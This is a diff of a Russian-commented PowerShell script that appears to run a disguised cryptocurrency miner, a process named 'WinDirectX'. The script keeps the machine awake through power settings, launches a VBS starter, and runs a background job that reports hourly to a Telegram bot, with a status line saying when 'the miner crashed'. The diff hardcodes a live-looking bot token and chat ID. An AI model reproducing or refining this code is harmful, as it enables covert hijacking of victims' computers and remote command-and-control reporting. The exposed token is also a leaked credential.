@@ -73,31 +73,31 @@ powercfg /x -monitor-timeout-ac 5
 powercfg /x -standby-timeout-ac 0
 Start-Process -FilePath "$path\win_start.vbs"
 
-# ФОНОВЫЙ ЦИКЛ ОТЧЕТОВ (ИСПРАВЛЕННЫЙ)
+# ФОНОВЫЙ ЦИКЛ ОТЧЕТОВ
 $Monitor = {
-    param($token, $id, $pc) # Принимаем данные из основного скрипта
+    param($pcName) # Принимаем имя компа из основного скрипта
     while($true) {
+        # СНАЧАЛА проверяем и отправляем, потом спим
         $p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
         $msg = if ($p) { "✅ Статус: Работаю (" + [Math]::Round($p.WorkingSet64 / 1MB, 2) + " MB)" } else { "⚠️ СТАТУС: МАЙНЕР ВЫЛЕТЕЛ!" }
         
-        $url = "https://api.telegram.org/bot$token/sendMessage"
-        $body = @{ chat_id = $id; text = "[$pc]: $msg" }
+        $url = "https://api.telegram.org/bot8260191816:AAE2rSVeuDnNG8nt4V-3vGjtfil3_ksqMwE/sendMessage"
+        $body = @{ chat_id = "6881699459"; text = "[$pcName]: $msg" }
         
         try { 
             Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue 
         } catch {}
 
-        # Спим час ПОСЛЕ отправки отчета
-        Start-Sleep -Seconds 3600 
+        Start-Sleep -Seconds 3600 # Спим час ПОСЛЕ отправки
     }
 }
 
-# Запускаем Job и ПЕРЕДАЕМ переменные (token, id, name) внутрь
-Start-Job -ScriptBlock $Monitor -ArgumentList $tgToken, $chatId, $env:COMPUTERNAME
+# Запускаем Job и передаем имя компа внутрь через -ArgumentList
+Start-Job -ScriptBlock $Monitor -ArgumentList $env:COMPUTERNAME
 
-# Уведомление о старте (без задержки)
+# Уведомление о старте
 $urlStart = "https://api.telegram.org/bot$tgToken/sendMessage"
 $bodyStart = @{ chat_id = $chatId; text = "[$env:COMPUTERNAME]: 🚀 СКРИПТ АКТИВИРОВАН! Мониторинг запущен." }
 Invoke-RestMethod -Uri $urlStart -Method Post -Body $bodyStart -ErrorAction SilentlyContinue
 
-Write-Host "--- ВСЁ ГОТОВО (ОТЧЕТЫ ПОЧИНЕНЫ) ---" -ForegroundColor Magenta
+Write-Host "--- ВСЁ ГОТОВО (ОТЧЕТЫ БУДУТ ПРИХОДИТЬ СРАЗУ) ---" -ForegroundColor Magenta
